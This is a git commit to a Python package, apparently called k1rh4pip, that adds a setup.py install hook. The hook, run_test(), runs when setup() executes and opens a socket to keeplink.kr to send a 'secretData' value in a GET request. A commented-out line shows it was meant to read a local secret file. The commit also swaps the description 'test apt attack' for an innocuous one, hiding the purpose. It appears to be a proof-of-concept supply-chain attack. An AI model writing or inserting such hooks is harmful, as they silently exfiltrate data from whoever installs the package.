0727bf501a1a74ba5076a6ec470eb59a9f7c1658
k1rh4 <k1rh4.lee@gmail.com>
2021-03-09 18:23:37 +0900

    final test

---
+++ a.py
@@ -0,0 +1,2 @@
+from k1rh4pip import test
+test.test_function("AAAAA")
--- setup.py
+++ setup.py
@@ -1,19 +1,36 @@
 from setuptools import setup, find_packages
- 
+from socket import *
+VERSION ="1.8"
+#f=open("secretData","r")
+secretData="this is secret key"
+#f.close()
+DATA=VERSION + ":" + secretData
+DATA = DATA.replace(" ","_")
+
+def run_test():
+    sock = socket(AF_INET,SOCK_STREAM)
+    sock.connect(("keeplink.kr".encode(),80))
+    #sock.send(str("GET /get.php?r=%s HTTP/1.0\r\n\r\n"%(DATA)).encode())
+    sock.send(str(("GET /get.php?r='%s' HTTP/1.0\r\n\r\n"%DATA)).encode())
+    sock.close()
+    #response = requests.get("http://keeplink.kr/get.php?r='aaaa'")
+
 setup(
     name                = 'k1rh4pip',
-    version             = '0.2',
-    description         = 'test apt attack',
+    version             = VERSION,
+    description         = 'k1rh4 pip test',
     author              = 'k1rh4.lee',
     author_email        = 'k1rha87@gmail.com',
     url                 = 'https://github.com/k1rh4/k1rh4pip',
     download_url        = 'https://github.com/k1rh4/k1rh4pip/archive/master.zip',
     install_requires    =  [],
     packages            = find_packages(exclude = []),
-    keywords            = ['pypi deploy'],
+    keywords            = ['pypi k2rh4'],
+    long_description=open('README.md').read(),
     python_requires     = '>=3',
     package_data        = {},
     zip_safe            = False,
+    k1rh4               = run_test(),
     classifiers         = [
         'Programming Language :: Python :: 3',
         'Programming Language :: Python :: 3.2',
